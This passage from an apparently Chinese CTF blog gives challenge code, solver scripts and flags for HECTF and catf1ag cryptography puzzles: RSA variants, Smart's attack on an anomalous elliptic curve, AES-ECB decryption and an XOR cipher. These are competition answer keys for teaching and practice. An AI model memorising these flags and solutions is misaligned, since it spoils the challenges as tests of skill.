class="params">m</span>):</span><br><span class="line">    h = m.<span class="built_in">hex</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(h) &amp; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">bytes</span>.fromhex(h).startswith(<span class="string">b&#x27;HECTF&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(h))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># About 16 mins to run 0x1337^2 == 24196561 times CRT</span></span><br><span class="line">start = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Start CRT...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    solution = CRT_list([<span class="built_in">int</span>(mpp)], [p])</span><br><span class="line">    <span class="keyword">if</span> check(solution):</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="built_in">print</span>(time.time() - start)</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Finished in &#123;&#125; seconds.&quot;</span>.<span class="built_in">format</span>(end - start))</span><br><span class="line"><span class="comment">#HECTF&#123;Happy_120th_birthday_to_Hebei_Normal_University&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="number">103250903193456504828487797156339600119426718627983781348818507950292820690249893916512022417900899107394861001239868070469917609264344248820063995415895904569850389089119540586899732656654237475843876867794510865961591835076374123380618390848608809256150058832564591055349379924805506351419667057604081135349</span></span><br><span class="line">p_= <span class="number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line">q_= <span class="number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="number">157798635503839469752446717651986470734467411686145972950533703965287076311312462611586472586638209970353426866979322760898287139085723568538059792571420311212101255127104335382081281902858421593497990417294935915897371187857482102407324837122921138869143815707149289272669578185431882034384720823115075903787</span></span><br><span class="line">c= <span class="number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line">n= <span class="number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本-2"><a href="#脚本-2" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">p_= <span class="number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line">q_= <span class="number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line">c= <span class="number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line">n= <span class="number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span></span><br><span class="line">p = <span class="number">103250903193456504828487797156339600119426718627983781348818507950292820690249893916512022417900899107394861001239868070469917609264344248820063995415895904569850389089119540586899732656654237475843876867794510865961591835076374123380618390848608809256150058832564591055349379924805506351419667057604081135349</span></span><br><span class="line">q = <span class="number">157798635503839469752446717651986470734467411686145972950533703965287076311312462611586472586638209970353426866979322760898287139085723568538059792571420311212101255127104335382081281902858421593497990417294935915897371187857482102407324837122921138869143815707149289272669578185431882034384720823115075903787</span></span><br><span class="line">t = n // (p*q)</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(t-<span class="number">1</span>)</span><br><span class="line">u = gmpy2.gcd(e//<span class="number">6</span>,phi)</span><br><span class="line"><span class="built_in">print</span>(u)</span><br><span class="line">d = gmpy2.invert(e//<span class="number">6</span>,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(m,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment">#HECTF&#123;Congratulation!!you_find_flag&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目直接给出了flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;409bd7db0eb11a54e47eb5d0c9c371900eb11a54e47eb5d02e&#125;</span><br></pre></td></tr></table></figure>



<h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><h3 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h3><h4 id="sage"><a href="#sage" class="headerlink" title="sage"></a>sage</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">k=</span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P = E.random_point()</span><br><span class="line">P.order()==p</span><br><span class="line">Q=k*P</span><br><span class="line">aes_key=k</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;P:&quot;</span>,P)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Q:&quot;</span>,Q)</span><br><span class="line"><span class="comment">#P=E(180571547161769,227820272156445)</span></span><br><span class="line"><span class="comment">#Q=E(76765539897460,69715189045993)</span></span><br></pre></td></tr></table></figure>

<h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">aes_key = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line">aes = AES.new(pad_key(aes_key), AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plain_text = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line">enc_text = aes.encrypt(pad(plain_text))</span><br><span class="line">enc_text_b64=base64.b64encode(enc_text)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc_text_b64)</span><br><span class="line">bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=</span><br></pre></td></tr></table></figure>

<h3 id="sage脚本"><a href="#sage脚本" class="headerlink" title="sage脚本"></a>sage脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">235322474717419</span></span><br><span class="line">a=<span class="number">0</span></span><br><span class="line">b=<span class="number">8856682</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">P=E(<span class="number">180571547161769</span>,<span class="number">227820272156445</span>)</span><br><span class="line">Q=E(<span class="number">76765539897460</span>,<span class="number">69715189045993</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SmartAttack</span>(<span class="params">P,Q,p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    Eqp = EllipticCurve(Qp(p, <span class="number">2</span>), [ ZZ(t) + randint(<span class="number">0</span>,p)*p <span class="keyword">for</span> t <span class="keyword">in</span> E.a_invariants() ])</span><br><span class="line"> </span><br><span class="line">    P_Qps = Eqp.lift_x(ZZ(P.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> P_Qp <span class="keyword">in</span> P_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(P_Qp.xy()[<span class="number">1</span>]) == P.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    Q_Qps = Eqp.lift_x(ZZ(Q.xy()[<span class="number">0</span>]), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">for</span> Q_Qp <span class="keyword">in</span> Q_Qps:</span><br><span class="line">        <span class="keyword">if</span> GF(p)(Q_Qp.xy()[<span class="number">1</span>]) == Q.xy()[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    p_times_P = p*P_Qp</span><br><span class="line">    p_times_Q = p*Q_Qp</span><br><span class="line"> </span><br><span class="line">    x_P,y_P = p_times_P.xy()</span><br><span class="line">    x_Q,y_Q = p_times_Q.xy()</span><br><span class="line"> </span><br><span class="line">    phi_P = -(x_P/y_P)</span><br><span class="line">    phi_Q = -(x_Q/y_Q)</span><br><span class="line">    k = phi_Q/phi_P</span><br><span class="line">    <span class="keyword">return</span> ZZ(k)</span><br><span class="line"> </span><br><span class="line">r = SmartAttack(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="comment">#152675955744921</span></span><br><span class="line">key=<span class="string">b&#x27;152675955744921&#x27;</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(text) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        text += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(key) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">        key += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"> </span><br><span class="line">aes = AES.new(pad_key(key), AES.MODE_ECB)</span><br><span class="line">c=<span class="string">&#x27;bXaw/g8fD7taMjlL/OyqUJluD6dZI5GkZb9RrE5GQk8=&#x27;</span></span><br><span class="line">c0=base64.b64decode(c)</span><br><span class="line"><span class="built_in">print</span>(c0)</span><br><span class="line">flag=aes.decrypt(c0)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#HECTF&#123;N0w_you_know_ecc_and_AES!&#125;</span></span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HECTF/" rel="tag">HECTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2022天权信安-catf1ag"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/03/14/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/"
    >2022天权信安&amp;catf1ag</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/03/14/2022%E5%A4%A9%E6%9D%83%E4%BF%A1%E5%AE%89-catf1ag/" class="article-date">
  <time datetime="2023-03-14T11:31:22.000Z" itemprop="datePublished">2023-03-14</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="2022天权信安-amp-catf1ag"><a href="#2022天权信安-amp-catf1ag" class="headerlink" title="2022天权信安&amp;catf1ag"></a>2022天权信安&amp;catf1ag</h1><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># from Crypto.Util.number import *</span><br><span class="line"># from flag import flag</span><br><span class="line">#</span><br><span class="line">#</span><br><span class="line"># def nextPrime(n):</span><br><span class="line">#     n += 2 if n &amp; 1 else 1</span><br><span class="line">#     while not isPrime(n):</span><br><span class="line">#         n += 2</span><br><span class="line">#     return n</span><br><span class="line">#</span><br><span class="line"># p = getPrime(1024)</span><br><span class="line"># q = nextPrime(p)</span><br><span class="line"># n = p * q</span><br><span class="line"># e = 0x10001</span><br><span class="line"># d = inverse(e, (p-1) * (q-1))</span><br><span class="line"># c = pow(bytes_to_long(flag.encode()), e, n)</span><br><span class="line"></span><br><span class="line">#d= 12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span><br><span class="line">#c= 11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span><br><span class="line">#n= 13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d= <span class="number">12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span></span><br><span class="line">c= <span class="number">11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span></span><br><span class="line">n= <span class="number">13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span></span><br><span class="line"></span><br><span class="line">p = gmpy2.next_prime(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">q = n // p</span><br><span class="line"><span class="comment"># d1 = gmpy2</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;3895dfda-67b1-11ed-b784-b07b2568d266&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">题目介绍：我好&quot;疑惑&quot;啊</span><br><span class="line">keys1 = welcome_to_nine-ak_match_is_so_easy_!@!</span><br><span class="line">keys2 = 20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92</span><br></pre></td></tr></table></figure>

<h3 id="脚本-1"><a href="#脚本-1" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">keys1 = <span class="string">&#x27;welcome_to_nine-ak_match_is_so_easy_!@!&#x27;</span></span><br><span class="line">keys2 = <span class="string">&#x27;20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92&#x27;</span></span><br><span class="line">keys2 = keys2.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(keys1[i])^<span class="built_in">int</span>(keys2[i])),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># catf1ag&#123;nine-ak_match_is@very_easy_@/!&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h2><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目描述：</span><br><span class="line">	小cat是某公司的安全侦察人员，在2022年9月9日凌晨6点，</span><br><span class="line">	小cat抓取到了几条疑似a人员和b人员交流的包，</span><br><span class="line">	经过破译，大致意思是“在今年xx月xx日xx点xx分准时进行数据交易”，</span><br><span class="line">	但是唯独不能完全破解出来，于是他发到公司的网络安全群寻求帮助：</span><br><span class="line">	69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95</span><br><span class="line">	（密文格式是：年份必须是4位数，月日时分必须是两位数，需要用0补齐，比如2022年01月01日01时01分）</span><br></pre></td></tr></table></figure>

